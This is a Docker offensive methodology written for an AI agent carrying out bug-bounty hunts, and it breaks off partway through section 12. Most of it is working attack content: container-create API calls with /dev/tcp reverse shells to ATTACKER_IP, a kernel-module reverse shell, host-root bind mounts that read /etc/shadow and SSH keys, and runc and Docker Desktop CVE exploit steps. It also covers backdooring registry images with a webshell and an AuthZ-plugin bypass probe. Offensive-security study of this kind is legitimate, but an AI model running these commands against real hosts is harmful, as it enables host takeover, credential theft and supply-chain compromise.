---
technology: "Docker"
kind: bug-bounty-methodology
audience: ai-agent
family: containers
version: "1.1"
last-refresh: "2026-11-19"
source: "corpus-mined (30 writeups, internal coverage ledger) + upstream-verified advisories and docs; v1.1 supplement adds expected-output API/registry walks, misconfig-detection matrix, verified CVE-lineage table, CTF notes, and severity/reporting guidance"
provenance: "Same basis as docker.md: 30-writeup strict re-gate + Docker/Moby/runc advisories (CVE-2025-9074, CVE-2021-41091, CVE-2019-5736, CVE-2024-21626) and docs.docker.com rootless docs. Pass 1 wave 5, 2026-11-12. Pass 2 extension 2026-11-12: 4.8 (shared host PID namespace /proc/<pid>/cwd + /root loot, from a re-adjudicated writeup previously excluded as daemon-interaction-negative) and 2.6 (lxd group -> privileged Alpine container mounting host /; lxd-alpine-builder chain verified against the saghul/lxd-alpine-builder upstream project). Wave 4 HT enrichment 2026-11-13: sections 2.7/2.8 and 5.1/5.2 (TLS-without-client-cert nuance incl. one flagged correction to 2.3, exec API + swarm endpoints, curl manifest/blob walk, push-based image backdooring, docker commit snapshotting) rewritten from HackTricks (src/network-services-pentesting/2375-pentesting-docker.md and 5000-pentesting-docker-registry.md), CC BY-NC 4.0, accessed 2026-11-13. Pentest-book supplement 2026-11-13: source: six2dez/pentest-book (enumeration/cloud/docker-and-and-kubernetes.md, no license — rewritten with attribution), accessed 2026-11-13; adds 1.1 MAC detection, 4.3 CAP_SYS_PTRACE and cgroup-v1 release_agent bullets (CVE-2022-0492 verified against Ubuntu's CVE tracker / kernel fix commit), plain-HTTP registry note in 5, tool-map additions. v1.1 supplement 2026-11-19 (model claude-opus-4-8): appended sections 11-17 — expected-output socket→privileged→chroot chain and v2 registry walk, misconfig-detection matrix (seccomp/AppArmor/userns-remap/caps), verified CVE-lineage table (2024 Leaky Vessels CVE-2024-21626/23651/23652/23653, 2025 runc trio CVE-2025-31133/52565/52881, CVE-2024-41110 AuthZ bypass), CTF-escape-box notes, severity/rootless-estimation/reporting guidance, and CI/CD docker-socket abuse; CVEs re-verified against NVD/GHSA/vendor advisories, see References."
---

# Docker — bug-bounty methodology

Companion overview: [[docker]] (mental model, where Docker appears, why the socket is the boundary). Audience: an agent executing a hunt. Every command below was shape-verified against a recorded engagement or upstream documentation; engagements that demonstrate a step are named in parentheses. Substitute `198.51.100.x` targets and `ATTACKER_IP` for your engagement values.

## 0. Fingerprint signatures

| Observation | Meaning |
|---|---|
| `/var/run/docker.sock` `srw-rw---- root docker` (or `root <custom-group>`) | Socket exists; check your group membership against the owning group (observed: group `engineer`) |
| `docker ps` → `permission denied ... unix:///var/run/docker.sock` | Daemon present, you lack access — pivot to group-membership/SUID/sudo paths (one observed engagement was probe-only) |
| nmap `2375/tcp http docker` / plaintext API answers on 2375 | Unauthenticated TCP Engine API — game over, curl it directly |
| nmap `2376/tcp ssl/docker` | TLS Engine API — needs client certs (`~/.docker/{ca,cert,key}.pm`) |
| `ps aux`: `/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock` + `containerd-shim-runc-v2` | Full daemon stack running as root; runc in the versions below is CVE-relevant (field-observed) |
| Port `5000` answering `/v2/` with header `Docker-Distribution-Api-Version: registry/2.0` | Docker Registry v2 — go to phase 5 |
| `192.168.65.x` reachable from a container, port 2375 open | Docker Desktop internal Engine API, pre-4.44.3 |
| Inside the box: `/.dockerenv` file, hex hostname, `/proc/1/cgroup` containing `docker` | You are IN a container — phase 4 |
| `id` shows the `lxd` group | Sibling container daemon access — the phase 2.6 privileged-container chain (root on host) |

## 1. Recon: am I in a container, and where is the daemon

```bash
# In-container detection (no tools needed)
ls /.dockerenv                                  # marker file
cat /proc/1/cgroup                              # docker cgroup entries
grep -i docker /proc/self/cgroup; find / -name "*dockerenv*" -exec ls -la {} \; 2>/dev/null
hostname                                        # 12-hex default container id

# Daemon discovery from a foothold
ls -al /var/run/docker.sock                     # canonical location
find / -name "docker.sock" 2>/dev/null          # nonstandard paths: /app/docker.sock (observed)
env | grep -i docker                            # DOCKER_HOST, DOCKER_TLS_VERIFY, DOCKER_CERT_PATH
id; groups                                      # docker group == root
ps auxfw | grep -E "dockerd|containerd|docker-proxy"   # daemon + which containers/proxies exist
sudo -l                                         # sudo-scoped docker (phase 3)
cat /proc/net/arp                               # sibling container IPs when netstat/ifconfig are stripped
ip link                                         # container MACs start 02:42: and encode the container IP
                                                # (02:42:ac:11:00:02 == 172.17.0.2 on the default bridge)
```

Read `ps` output carefully: `docker-proxy -host-port 8080 -container-ip 172.17.0.x` names the published ports and the container IPs without touching the daemon. Systemd units (`docker.service`, `Requires=docker.socket`) and `docker-compose.yml` files in `/opt` reveal `privileged: true` and socket pass-through mounts (both field-observed).

## 2. Exploiting daemon access

**2.1 docker group / writable socket — the standard host mount.** If `id` shows the docker group (or the socket's group is yours):

```bash
docker images                                   # what exists locally
docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
docker run -it -v /root:/mnt alpine             # mount only what you need
docker run -ti -v /:/mnt/ --name alpine alpine /bin/sh       # then chroot /mnt
```

No images and no internet (air-gapped host): pull, save, transfer, load —

```bash
# attacker box
docker pull alpine && docker save alpine:latest > alpine.tar && scp alpine.tar user@198.51.100.x:~
# target
docker load -i alpine.tar && docker run -ti -v /:/mnt/ alpine /bin/sh
```

**2.2 Raw API over the socket when the CLI is absent.** curl speaks the daemon's HTTP directly:

```bash
curl -s --unix-socket /var/run/docker.sock http://localhost/version
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
cmd='["/bin/sh","-c","chroot /mnt sh -c \"bash -c '\''bash -i>&/dev/tcp/ATTACKER_IP/4446 0>&1'\''\""]'
curl -s -XPOST --unix-socket /var/run/docker.sock \
  -d "{\"Image\":\"sandbox\",\"Cmd\":$cmd,\"Binds\":[\"/:/mnt:rw\"]}" \
  -H 'Content-Type: application/json' http://localhost/containers/create
curl -s -XPOST --unix-socket /var/run/docker.sock \
  http://localhost/containers/<returned-id>/start
```

Alternative to curl: upload a **static docker binary** and point it at any socket path —

```bash
wget http://ATTACKER_IP:8080/docker -O /tmp/docker && chmod +x /tmp/docker
/tmp/docker -H unix:///app/docker.sock ps
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/host <local-image>
/tmp/docker -H unix:///app/docker.sock exec -it <new-id> /bin/bash
```

**2.3 TCP daemon, 2375/2376.** Plaintext 2375: same endpoints over `http://198.51.100.x:2375`. TLS 2376 demands a client certificate only when the daemon actually verifies clients (`--tlsverify`); a daemon started with plain `--tls` encrypts but authenticates nobody — 2.7. If client certs ARE required, hunt for `~/.docker/` of a privileged user, or a writable CA you can mint from: one observed engagement shows the full chain (CSR signed by the service's own CA → `.docker/{ca,cert,key}.pem` → `export DOCKER_TLS_VERIFY=1 DOCKER_CERT_PATH=... DOCKER_HOST=tcp://127.0.0.1:2376` → `docker ps` → `docker run -it --rm -v /:/mnt <image> bash`). If the daemon uses fd:// (systemd socket activation), local TLS may still be bound on loopback — check `ss -lntp`.

**2.4 Docker Desktop (Windows/macOS hosts).** From ANY container, the internal Engine API sits on the Desktop VM subnet, `192.168.65.x:2375` in default configs — unauthenticated on Docker Desktop 4.25 through < 4.44.3 (CVE-2025-9074; works with Enhanced Container Isolation on or off). Exploit is two POSTs:

```bash
curl -s -X POST http://192.168.65.x:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Tty":true,
       "Cmd":["sh","-c","cat /mnt/users/administrator/desktop/root.txt"],
       "HostConfig":{"Binds":["/run/desktop/mnt/host/c/:/mnt"]}}'
curl -s -X POST http://192.168.65.x:2375/containers/<id>/start
```

Windows drives appear inside Linux containers at `/run/desktop/mnt/host/<drive-letter>/`. Verify the installed version from changelogs/about pages before claiming the CVE (fixed in 4.44.3).

**2.5 Management UIs as daemon proxies.** Portainer web UIs bound to the host socket (two observed engagements): the UI's "create container" form (Volumes tab: host `/` → container `/tmp`, User: root) is the same bind-mount primitive without shell access; the build page turns a Dockerfile into phase 4's CVE-2024-21626. GitLab CI runners with a docker executor spawn job containers that inherit the runner's environment — a `.gitlab-ci.yml` with `image: redis:alpine`, `pull_policy: if-not-present`, `script: [env]`, and the runner's tag dumps service tokens (`AUTHENTIK_TOKEN`, field-observed). Job containers are throwaway: prefer env-dump over rev-shell unless the runner mounts something.

**2.6 The `lxd` group — the same chain on the sibling container daemon.** `id` showing the `lxd` group is a root check for exactly the reason the docker group is: the LXD daemon does privileged work on request, and group membership speaks to it. The canonical chain (field-observed end to end) starts on your own box — build an Alpine LXD image with the lxd-alpine-builder project, transfer the tarball over — then on the target:

```bash
lxd init                                                  # accept defaults through the prompts
lxc image import ./alpine-*.tar.gz --alias alpine
lxc init alpine pwn -c security.privileged=true           # container runs as real root, no user namespace
lxc config device add pwn hostdisk disk source=/ path=/mnt/root   # host / as a disk device
lxc start pwn && lxc exec pwn /bin/sh                     # root shell, host filesystem at /mnt/root
```

Same recipe as 2.1 with different verbs: privileged container + host root mounted → read and write everything (`chroot /mnt/root`, edit `/mnt/root/etc/shadow`, plant SUID binaries or SSH keys). When the host has no outbound access the image travels like phase 2.1's save/load; on Docker daemons the equivalent trick is reusing an image already present locally — an observed chain built its escape container from an Alpine-based application image already on the daemon instead of pulling. LXD membership is worth checking even where docker group rights were deliberately withheld — `id` for BOTH.

**2.7 TLS 2376 without client authentication.** A 2376 listener proves TLS, not client-certificate enforcement. Daemons started with `--tls` (no `verify`) encrypt the channel but admit any client: `curl --insecure https://198.51.100.x:2376/version` answers, and the docker CLI equivalent is `docker --tls -H tcp://198.51.100.x:2376 ...` (`--tlsverify` is the flag that demands your `~/.docker/{ca,cert,key}.pem`). Set `export DOCKER_HOST=tcp://198.51.100.x:2376` once and drop the `-H` from every command. Automated equivalents: nmap's docker NSE family (`nmap -sV --script "docker-*" -p 2375 198.51.100.x`) and Metasploit's `exploit/linux/http/docker_daemon_tcp`.

**2.8 The exec API — run commands inside containers that already exist.** `containers/create` + `start` is the loud road (a new container shows in `docker ps`); the two-step exec API drives an EXISTING container and leaves no new object behind:

```bash
curl -k -XPOST -H 'Content-Type: application/json' \
  https://198.51.100.x:2376/containers/<id>/exec \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["/bin/sh","-c","cat /run/secrets/registry-key.key"]}'
curl -k -XPOST -H 'Content-Type: application/json' \
  https://198.51.100.x:2376/exec/<returned-exec-id>/start -d '{}'
```

`GET /containers/<id>/json` first names the container and its mounts; the same two POSTs work over the unix socket with `--unix-socket`. On swarm-enabled daemons add one GET each for `/secrets` and `/services` — swarm secrets ride the API, and service definitions expose environment-injected credentials the same way `docker inspect` does. From a container with cloud-network access, the classic exec payload is the metadata endpoint (`http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`) — credentials without touching the instance itself.

## 3. Sudo-scoped docker (no group, no socket)

`sudo -l` on docker hosts (all four seen in the field):

```bash
(root) NOPASSWD: /snap/bin/docker exec *
sudo docker exec -u root --privileged -it <container-id> bash   # then: mount /dev/sda1 /mnt
(ALL) NOPASSWD: /usr/bin/docker network ls
(ALL) NOPASSWD: /usr/bin/docker network inspect *           # harvest internal subnets (prodnet)
(ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*      # → runc CVE below
```

`docker exec` with a wildcard is root-in-container; combine with `-u root --privileged` to upgrade a running container to privileged, then `mount` the host block device (find it via `mount` output — `/dev/sda1 on /etc/hostname` — or `lsblk`, then `mount /dev/sda1 /mnt`). `docker network inspect` is pure recon: it names every bridge subnet for lateral scanning (field-observed). SUID "docker helper" binaries are the same class: one observed `/usr/local/bin/docker-security` SUID binary called `chmod` by relative path (its job: `chmod 660 /var/run/docker.sock`) — PATH-hijack the helper for root.

## 4. Escaping from inside a container

**4.1 Enumerate first** — `capsh --print` (capabilities), `mount`/`findmnt` (bind mounts, device exposure), `lsblk` (block devices), the compose file if readable, `deepce` (scripted container-privilege enumeration, field-used). Code pair — what you are looking for:

```yaml
# vulnerable                                # hardened
services:  app:                              services:  app:
  privileged: true                             cap_drop: [ALL]
  volumes:                                     security_opt: [no-new-privileges:true]
    - "/:/host"    # host root bind            # no host-path binds of /
```

**4.2 `--privileged` container:** mount the host disk directly —

```bash
lsblk                          # find the root partition (sda2/sda1)
mount /dev/sda2 /mnt -o loop   # then read/edit /mnt/root/.ssh/*, flags
```

**4.3 Capability escapes (no privileged flag needed):**
- `CAP_SYS_MODULE` → compile and insmod a reverse-shell LKM; the module runs in the HOST kernel (`call_usermodehelper("bash -c bash -i >&/dev/tcp/ATTACKER_IP/4444 0>&1")` inside `module_init`, field-observed).
- `CAP_DAC_READ_SEARCH` → the shocker filehandle trick: open a container file, then `open_by_handle_at` walk to host paths like `/root/root.txt` (field-observed). Works because DAC checks are bypassed for the capability holder.
- `CAP_SYS_PTRACE` + shared host PID namespace (`--pid=host`) → classic process injection rather than escape: find a host root process in `ps aux`, inject shellcode into it (a tiny ptrace injector or linux-inject style tool) and execute inside that process's context.
- `CAP_SYS_ADMIN` (or the CVE-2022-0492 bug, which let an unprivileged cgroup-v1 mount write `release_agent` without it) → the cgroup-v1 release_agent escape: mount a cgroup v1 controller, set `notify_on_release` on a child, point `release_agent` at a script on the host (derive the host path of your mount from the `perdir=` field in `/etc/mtab`), then trigger it by joining the child cgroup — the kernel runs your script as root on the host. Kernel-side fix: mainline commit `24f600856418`; distro backports vary, so gate on behavior (can you write `release_agent`?) not on kernel version. Note the mount itself is what needs `CAP_SYS_ADMIN`; sources that label this a NET_ADMIN escape are wrong — NET_ADMIN manages interfaces, not cgroup filesystems.

**4.4 Mounted host directory — write-back SUID:** a host user dir mounted rw into the container plus a shell on the host = root. From the host: `cp /bin/bash ~augustus && exit`; from the container (root): `chown root:root bash && chmod 4755 bash`; back on the host run `./bash -p`. Permissions written through the bind apply on the host.

**4.5 Moby CVE-2021-41091 (Engine < 20.10.9), host side:** `/var/lib/docker` subdirs were world-traversable. As a low-privileged HOST user: `findmnt` lists the overlay2 mounts; `mount` inside the container shows its overlay id (starts `c41d58...`); then `cd /var/lib/docker/overlay2/<id>/merged` — you can read the container FS and drop SUID binaries for host users to execute (field-observed). Check `docker --version` first.

**4.6 runc CVE-2019-5736 (runc <= 1.0-rc6, Docker < 18.09.2 / < 18.06.3):** overwrite the host runc binary via `/proc/self/exe`. Requires root in a container plus an admin willing to `docker exec` again: replace `/bin/bash` in the container with a script that copies a malicious ELF over `/proc/self/exe` (the running runc), wait for the NEXT `sudo docker exec -it webapp-dev01 /bin/bash_original` — the host executes your payload as root. PoC repo: twistlock/RunC-CVE-2019-5736; msfvenom ELF as the replacement binary.

**4.7 runc CVE-2024-21626 (runc <= 1.1.11, fixed 1.1.12):** leaked fd → working directory on the host filesystem. Two observed forms:
- With `docker build` rights: Dockerfile `FROM ubuntu:latest`, `WORKDIR /proc/self/fd/8`, `RUN cd ../../../../../../../../ && chmod -R 777 tmp/exploit && chown -R root:root tmp/exploit && chmod u+s tmp/exploit/bash` — build via Portainer/sudo, then run the SUID bash on the host. (Exact fd number can differ by runc version — 7 and 8 both seen.)
- With a runc bundle: `docker export $(docker create alpine:latest) > alpine.tar` locally, stage `config.json` + rootfs, set `"cwd": "/proc/self/fd/7"` via `perl -i -pe 's/"cwd": "\/",/"cwd": "\/proc\/self\/fd\/7",/'`, run `runc run` (here through the box's sudo-gated debug wrapper) — the shell lands with cwd on the host FS.
Gate both on `runc --version` first (1.1.7 and 1.1.11 both observed vulnerable; 1.1.12 fixed).

**4.8 Shared host PID namespace: `/proc/<pid>/cwd` loot.** A container started with `--pid=host` (compose: `pid: host`) sees every host process — and `/proc` then hands over the host filesystem with no mount, no escape, no capabilities. Enumerate from inside: `ls -l /proc/*/cwd` — a process whose working directory resolves to a *host* path (a service user's home, `/root`, a project directory) is the giveaway that the namespace is shared (field-observed: a container whose only notable artifact was a single peculiar process whose cwd pointed into a host home directory). Then read through the magic symlinks:

```bash
ls -l /proc/<pid>/cwd                  # → /home/<user>  — a HOST path
cat /proc/<pid>/cwd/.ssh/id_rsa        # that host user's SSH key
ls /proc/<pid>/root/                   # the process's root = the HOST filesystem
cat /proc/<pid>/root/etc/shadow        # readable when the host process runs as root
```

`/proc/<pid>/root` is the stronger primitive (the entire host tree), but permissions are checked against the *target process's* credentials — root-owned host daemons expose everything, unprivileged ones only their own files. `cwd` is usually all you need: home directories hold keys, history, and flags. The chain ends as lateral movement — the stolen key SSHes into the host as that user.

## 5. Registry interaction (port 5000)

```bash
curl -k https://198.51.100.x:5000/v2/                     # 200/401 tells auth mode
curl -k https://198.51.100.x:5000/v2/_catalog            # repository list
curl -k https://198.51.100.x:5000/v2/_catalog -u user:pass        # basic auth
curl -k https://example.com:5000/v2/<repo>/tags/list     # tags
```

Bearer-token registries issue a token from their auth endpoint, then accept it on `/v2/_catalog` (field-observed). To `docker pull` from a self-signed TLS registry: export the cert (`openssl s_client -showcerts -connect example.com:5000`), install it (`update-ca-certificates`), restart docker. If the registry is only reachable from the target network, forward it out with chisel (`chisel client ATTACKER_IP:8000 R:5000:172.18.0.x:5000`) and pull as `localhost:5000/<repo>`. Registry enum without docker at all: DockerRegistryGrabber (`drg.py --dump`, field-used) walks catalogs/manifests/blobs over HTTP.

**5.1 Curl-only walk — manifests and blobs with no docker client.** The v2 API is plain HTTP; every step of a dump is a curl away:

```bash
# manifest for a tag — request the modern formats, note the reply shape
curl -s -H 'Accept: application/vnd.oci.image.manifest.v1+json, application/vnd.docker.distribution.manifest.v2+json' \
  https://example.com:5000/v2/<repo>/manifests/latest
# legacy schema-1 replies list layer digests directly in fsLayers[].blobSum
# .../v2/<repo>/blobs/sha256:<digest>   <- download any listed layer blob
curl -sL https://example.com:5000/v2/<repo>/blobs/sha256:<digest> -o layer.tar
tar -tf layer.tar                 # LIST entries first — layers are untrusted archives
mkdir layer-N && tar -xf layer.tar -C layer-N   # extract each layer into its OWN dir
```

Per-layer directories matter twice: overlay merges destroy the layer-by-layer history (which layer deleted which secret), and a hostile layer can carry traversal paths. DockerRegistryGrabber's fuller surface: `--list`, `--dump <repo>`, `--dump_all`, with `-U/-P` (basic auth) or `-A '<token>'` (bearer) — one command replaces the whole walk when write access to the target network is awkward. The `Docker-Distribution-Api-Version: registry/2.0` header on `/v2/` (200 or 401 alike) is the protocol fingerprint when a reverse proxy hides the port.

**5.2 Write access — poison the supply chain, then wait.** Write permission on a repository a deployment pulls from is code execution in that deployment, on its schedule:

```bash
docker pull example.com:5000/<app-image>
docker history example.com:5000/<app-image>          # the build commands name what runs
# plant a payload in a derived image:
#   FROM example.com:5000/<app-image>
#   COPY shell.php /app/                              # or: modified sshd_config + root password
docker build -t example.com:5000/<app-image> .        # use a DISPOSABLE tag on shared registries
docker push example.com:5000/<app-image>
```

The webshell variant lands when the app serves the copied file; the SSH variant rewrites `sshd_config` (`PermitRootLogin yes` + a set password) inside the image. Prefer a fresh tag on any registry others consume — overwriting a production tag is an outage you caused. The snapshot cousin: `docker commit <container-id> example.com:5000/<name>` freezes a RUNNING container (including its filesystem changes and secrets) into an image you can pull apart at leisure.

**5.3 Plain-HTTP registries.** A self-hosted registry without TLS at all (the distribution default when started bare) still answers `/v2/`, but the docker client refuses plain HTTP for non-local hosts. Two routes: read the catalog/manifests/blobs with curl exactly as in 5.1 (works over plain HTTP), or let the daemon trust it — add `--insecure-registry <host>:5000` to the `ExecStart=` line of the docker systemd unit, `systemctl daemon-reload && systemctl restart docker`, then `docker pull <host>:5000/<repo>:<tag>` and dissect the image with 5.2/6 tooling. Stolen registry credentials live in `~/.docker/config.json` (auth entries are base64 of `user:password`); a readable one on a host you hold is a straight login for private image pulls.

## 6. Image abuse and layer archaeology

```bash
docker load < image.tar                       # a downloaded image file
docker run -it <image> sh                     # poke the live filesystem
dive docker-archive://image.tar               # per-layer diffs; ctrl+u modified files
tar -xf <layer-dir>/layer.tar                 # extract a SPECIFIC earlier layer
```

Secrets routinely survive as **deleted files in earlier layers** (one observed image: a `db.sqlite3` with the admin hash was rm'd in a later layer; deleted `routes.py` exposed the invite logic). `ENV` history and `.bash_history` bake in similarly. Pulled image with a fixed entrypoint? Override it: `docker run -v /:/mnt --entrypoint sh -it <image-id>` (field-observed). Move files in/out of a running container with `docker cp` (one observed chain pulled the hosting-app war, edited, pushed payload back).

## 7. Container networking and pivoting

- **The bridge gateway is the host**: default bridge `172.17.0.x` → host at the first address; custom compose networks use 172.1x.0.x (one observed chain scanned `172.19.0.x` and SSH'd to the host; legacy Toolbox docs: "the Docker host is always present at the gateway IP address"). No nmap needed: `for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.17.0.x/$PORT" 2>/dev/null && echo open: $PORT; done`.
- **Sibling containers** are one hop away: `/proc/net/arp` lists recent neighbors (field-observed), then port-scan and pivot with chisel; sibling containers may expose SSH (observed) or the app port the reverse proxy hides (observed, under kubernetes).
- **Docker Toolbox** legacy: Boot2Docker VM creds `docker`/`tcuser`, VM reachable by SSH at the gateway, `C:\Users` mounted at `/c/Users` inside it.
- Watch for `DOCKER_HOST` in compose files pointing at the host socket from inside a container — LocalStack-style tooling mounts `/var/run/docker.sock` into app containers, which is the escape hatch (field-observed; also the injection site: pspy showed a root-run `docker create` whose arguments came from user input — inject into the handler, get root, then phase 2 with the inherited socket env).

## 8. The rootless-mode gate (check before you celebrate)

Before reporting any socket/group/container chain as host-root:

```bash
ls -la /run/user/*/docker.sock 2>/dev/null    # rootless socket location ($XDG_RUNTIME_DIR)
docker info 2>/dev/null | grep -i -E "root|rootless|context"
echo $DOCKER_HOST                              # rootless setups export unix:///run/user/1000/docker.sock
```

Rootless daemons (`dockerd-rootless.sh`, stable since Engine 20.10) run dockerd and containers **as an unprivileged user inside a user namespace**; data lives in `~/.local/share/docker`, not `/var/lib/docker`. A socket win there yields that user's privileges on the host — still escalation, but not root, and `mount`-the-host chains degrade accordingly. Report the distinction rather than assuming.

## 9. Command quick reference

```bash
# access probes
id | ls -al /var/run/docker.sock | env | grep DOCKER | docker ps
curl -s --unix-socket /var/run/docker.sock http://localhost/version
# root via socket
docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
# raw API
curl -XPOST --unix-socket /var/run/docker.sock -d '{"Image":"alpine","Cmd":["sh"],"Binds":["/:/mnt"]}' -H 'Content-Type: application/json' http://localhost/containers/create
# registry
curl -k https://198.51.100.x:5000/v2/_catalog ; curl -k .../v2/<repo>/tags/list
# image forensics
dive docker-archive://image.tar ; docker save <img> -o out.tar
# escape checks
capsh --print ; lsblk ; cat /proc/1/cgroup ; runc --version ; docker --version
# shared host PID namespace (no mount needed)
ls -l /proc/*/cwd ; cat /proc/<pid>/cwd/.ssh/id_rsa ; ls /proc/<pid>/root/
# lxd group -> privileged Alpine container with host / mounted
lxc init alpine pwn -c security.privileged=true ; lxc config device add pwn hostdisk disk source=/ path=/mnt/root ; lxc start pwn ; lxc exec pwn /bin/sh
```

## 10. Tool map (prose)

The docker CLI and raw curl cover the daemon surface (curl's `--unix-socket` needs no client); a static docker binary uploaded to stripped boxes replaces the CLI (field-observed). `dive` for layer archaeology, `deepce` for in-container privilege enumeration. DockerRegistryGrabber for HTTP-only registry dumps. `chisel` for registry and subnet forwarding out of container networks. `pspy` to catch root-run docker commands (build/create) you can inject into. `capsh` for capability reads, `findmnt`/`mount` for overlay2 correlation, `msfvenom` for runc-replacement payloads, Metasploit ships a CVE-2024-21626 module. Portainer and GitLab CI are target-side surfaces that proxy the daemon (both field-observed). For the lxd sibling: the `lxc`/`lxd` CLIs on the target plus saghul's lxd-alpine-builder on your box produce the privileged-Alpine chain (2.6). Image-side additions: `trivy` and `grype` scan a pulled image for known package CVEs (a quick way to turn an image pull into a finding list), `Whaler` reconstructs a Dockerfile from an image (read the build's RUN lines without layer spelunking), `amicontained` reports container runtime/capabilities/seccomp from inside. Cross-vault: per-tool notes live in the tools vault; Kubernetes-flavored variants of these chains (kubelet exec, pod create) live in [[kubernetes-bug-bounty|the kubernetes methodology]].

---

## Supplement — expected-output walks, misconfig detection, CVE lineage, CTF and reporting (added 2026-11-19)

*Source: v1.1 model supplement (claude-opus-4-8). CVE rows re-verified against NVD / GitHub Security Advisories / vendor advisories at write time; API and registry response shapes verified against the Docker Engine API and OCI distribution-spec references. Every section below extends the phases above — nothing earlier was rewritten or weakened. These additions bias toward two things the field guide was thin on: the **exact bytes a step returns** (so an agent can diff against a baseline and decide, not guess), and the **triage/severity framing** that turns a demonstrated chain into a defensible report.*

### 11. The socket→privileged→chroot chain with expected outputs

Sections 2.1–2.2 show the moves; this is the same chain annotated with what each call returns, so an agent executing blind can branch on the response instead of hoping. Everything here is single-request and read-first — `GET` before you `POST`, and never a destructive verb on a container you did not create. Point `SOCK` at the socket (or swap `--unix-socket "$SOCK"` for `tcp://host:2375` endpoints from 2.3/2.7).

```bash
SOCK=/var/run/docker.sock

# Step 1 — prove the socket talks, and read the stack version in one shot
curl -s --unix-socket "$SOCK" http://localhost/version | jq '{Version,ApiVersion,Os,Arch}'
# -> {"Version":"27.3.1","ApiVersion":"1.47","Os":"linux","Arch":"amd64"}
#    A JSON body = you have daemon access. "permission denied" = no socket rights (pivot to phase 3).
#    The Version string is your CVE gate for section 13 — record it verbatim.

# Step 2 — the single most important branch: rootless or root? (ties into phase 8)
curl -s --unix-socket "$SOCK" http://localhost/info | jq '{Name,SecurityOptions,DockerRootDir}'
# -> root daemon:
#    {"Name":"prod-01","SecurityOptions":["name=seccomp,profile=builtin","name=apparmor"],"DockerRootDir":"/var/lib/docker"}
# -> rootless daemon (DO NOT claim host-root — see 15):
#    {"...","SecurityOptions":["name=seccomp,profile=builtin","name=rootless","name=userns"],"DockerRootDir":"/home/svc/.local/share/docker"}
#    "name=rootless" present  => any win below is that service user's privileges, not root.
#    "name=userns" present    => root-in-container is remapped; a /:/mnt mount lands you as a non-0 host uid.
```

If Step 2 says root, the escape is three calls. The `create` body carries everything in one object — privileged, the host-root bind, and an unconfined profile so nothing in the container stops you:

```bash
# Step 3 — create a privileged container with host / bound in (loudest but surest)
ID=$(curl -s -XPOST --unix-socket "$SOCK" http://localhost/containers/create \
  -H 'Content-Type: application/json' -d '{
    "Image":"alpine",
    "Cmd":["/bin/sh","-c","chroot /host sh -c id; cat /host/etc/shadow | head -1"],
    "HostConfig":{"Binds":["/:/host:rw"],"Privileged":true,
                  "SecurityOpt":["seccomp=unconfined","apparmor=unconfined"]}
  }' | jq -r .Id)
echo "$ID"
# -> 9f3c1d0b7a24e8...   (64-hex container id)  — {"message":"No such image: alpine"} means pull first (2.1 save/load)

# Step 4 — start it (204 = running, no body)
curl -s -o /dev/null -w '%{http_code}\n' -XPOST --unix-socket "$SOCK" http://localhost/containers/$ID/start
# -> 204

# Step 5 — read what it did (the proof)
curl -s --unix-socket "$SOCK" "http://localhost/containers/$ID/logs?stdout=1&stderr=1" --output -
# -> uid=0(root) gid=0(root) groups=0(root) ...
#    root:$6$<hash>:19xxx:0:99999:7:::        <- host /etc/shadow, through the bind. Chain proven.

# Step 6 — clean up the evidence trail you created (authorized-program hygiene)
curl -s -o /dev/null -w '%{http_code}\n' -XDELETE --unix-socket "$SOCK" "http://localhost/containers/$ID?force=1"
# -> 204
```

Decision points: a **404 on `create`** for the image name means no local image — reuse one already present (`GET /images/json | jq -r '.[].RepoTags[]'`) rather than pulling over the program's network. A **403/500 from `create` with a privileged/bind body** on an otherwise-working socket is the tell that an **authorization plugin** sits in front of the daemon (AuthZ) — which is itself the lead for CVE-2024-41110 (section 13): retry the exact request with `Content-Length: 0` and an empty body routed through the same path and watch whether the plugin waves it through. The **exec variant (2.8)** is the quiet road — drive a container already in `docker ps` and no new object appears; prefer it on engagements where `docker ps` is monitored.

Evidence to capture for the report, in order: the `/version` string, the `SecurityOptions` array (proves root vs rootless), the `create` request body verbatim, the returned container id, and the `logs` output showing `uid=0` plus one unambiguous host-only artifact (a line of `/etc/shadow`, the host's `/etc/machine-id`, a hostname that differs from the container's). Redact secret material to the minimum that proves cross-boundary read; delete the container.

### 12. v2 registry enumeration with expected outputs, and layer archaeology

Phase 5 lists the endpoints; here is what each returns so you can tell "empty registry" from "auth wall" from "wrong port," plus the step most walks skip — **the config blob, where the secrets actually are**.

```bash
REG=https://198.51.100.x:5000

# Auth mode — the status code and headers decide your next move
curl -sik $REG/v2/ | head -5
# -> HTTP/1.1 200 OK                                  <- open registry, no auth
#    Docker-Distribution-Api-Version: registry/2.0    <- protocol fingerprint (present on 401 too)
# -> HTTP/1.1 401 Unauthorized
#    Www-Authenticate: Bearer realm="https://198.51.100.x/token",service="registry"
#    ^ bearer flow: GET the realm with ?service=&scope=repository:<repo>:pull to mint a token, then -H "Authorization: Bearer <t>"

# Catalog — note pagination: large registries return a Link header, NOT every repo
curl -sk "$REG/v2/_catalog?n=100"
# -> {"repositories":["backend/api","backend/worker","internal/ci-runner"]}
#    If a response carries  Link: <...?n=100&last=internal/ci-runner>; rel="next"  -> follow it with &last=<lastname>.
#    curl -sik "$REG/v2/_catalog?n=100" | grep -i '^link:'    # check before assuming the list is complete

# Tags, then the manifest — ask for modern media types explicitly
curl -sk $REG/v2/backend/api/tags/list
# -> {"name":"backend/api","tags":["latest","v1.4.2","staging"]}

curl -sk -H 'Accept: application/vnd.docker.distribution.manifest.v2+json, application/vnd.oci.image.manifest.v1+json' \
  $REG/v2/backend/api/manifests/latest | jq '{config:.config.digest, layers:[.layers[].digest]}'
# -> {"config":"sha256:a1b2...","layers":["sha256:c3d4...","sha256:e5f6..."]}
#    schema-1 (legacy) replies instead carry fsLayers[].blobSum — still blob digests, still pullable.
```

The config blob is the under-mined prize: it holds `Env`, `Cmd`, `Entrypoint`, `Labels`, and the build history — where hardcoded tokens, DB URLs, and `ARG`-leaked secrets live without extracting a single layer tarball:

